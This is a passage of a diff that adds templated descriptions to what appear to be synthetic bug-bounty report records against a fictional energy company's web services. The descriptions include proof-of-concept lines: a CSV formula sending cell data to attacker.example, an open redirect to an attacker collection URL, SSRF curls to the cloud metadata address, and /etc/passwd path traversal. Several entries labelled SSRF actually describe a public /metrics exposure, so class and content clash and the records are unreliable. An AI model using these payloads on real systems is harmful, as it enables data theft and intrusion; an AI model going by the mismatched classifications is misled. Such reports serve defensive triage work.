-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.rheinspitze-energie.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13883,7 +13989,8 @@
           "offset": "5d 5h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.rheinspitze-energie.foo/v2/me`\n- Preconditions: authenticated user: support agent; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -13988,7 +14095,8 @@
           "offset": "1d 19h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.rheinspitze-energie.foo/metrics`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14083,7 +14191,8 @@
           "offset": "11h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.rheinspitze-energie.foo/export?type=records`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14160,7 +14269,8 @@
           "offset": "19h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.rheinspitze-energie.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14332,7 +14442,8 @@
           "offset": "6d 18h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.rheinspitze-energie.foo/profile`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14427,7 +14538,8 @@
           "offset": "19h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.rheinspitze-energie.foo/api/import`\n- Preconditions: authenticated user: radiologist; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14574,7 +14686,8 @@
           "offset": "5d 18h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.rheinspitze-energie.foo/api/documents/`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14726,7 +14839,8 @@
           "offset": "6d 6h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.rheinspitze-energie.foo/export?type=records`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -14888,7 +15002,8 @@
           "offset": "7d 10h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.rheinspitze-energie.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15016,7 +15131,8 @@
           "offset": "1d 3h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.rheinspitze-energie.foo/api/documents/`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15128,7 +15244,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.rheinspitze-energie.foo/statements/`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15232,7 +15349,8 @@
           "offset": "1d 1h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.rheinspitze-energie.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15358,7 +15476,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://www.rheinspitze-energie.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15497,7 +15616,8 @@
           "offset": "5d 6h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.rheinspitze-energie.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15621,7 +15741,8 @@
           "offset": "2d 16h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.rheinspitze-energie.foo/export`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15745,7 +15866,8 @@
           "offset": "5d 3h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.rheinspitze-energie.foo/api/me`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15852,7 +15974,8 @@
           "offset": "1d 7h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.rheinspitze-energie.foo/statements/`\n- Preconditions: authenticated user: unauthenticated; app version: API v2\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -15982,7 +16105,8 @@
           "offset": "3d 11h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://www.rheinspitze-energie.foo/export`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16081,7 +16205,8 @@
           "offset": "1d 5h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.rheinspitze-energie.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16211,7 +16336,8 @@
           "offset": "5d 20h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.rheinspitze-energie.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16306,7 +16432,8 @@
           "offset": "1d 2h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.rheinspitze-energie.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16457,7 +16584,8 @@
           "offset": "5d",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.rheinspitze-energie.foo/api/v2/documents/`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16571,7 +16699,8 @@
           "offset": "7h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.rheinspitze-energie.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16699,7 +16828,8 @@
           "offset": "1d 5h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://billing.rheinspitze-energie.foo/statements/`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -16855,7 +16985,8 @@
           "offset": "4d 3h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://auth.rheinspitze-energie.foo/auth/callback?next=https://evil.foo`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17031,7 +17162,8 @@
           "offset": "7d 6h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.rheinspitze-energie.foo/v2/me`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17163,7 +17295,8 @@
           "offset": "7d 1h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.rheinspitze-energie.foo/statements/`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17259,7 +17392,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.rheinspitze-energie.foo/fetch`\n- Preconditions: authenticated user: citizen; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17410,7 +17544,8 @@
           "offset": "5d 12h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.rheinspitze-energie.foo/export`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17572,7 +17707,8 @@
           "offset": "4d 5h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://api.rheinspitze-energie.foo/metrics`\n- Preconditions: authenticated user: admin; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -17695,7 +17831,8 @@
           "offset": "5d 18h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
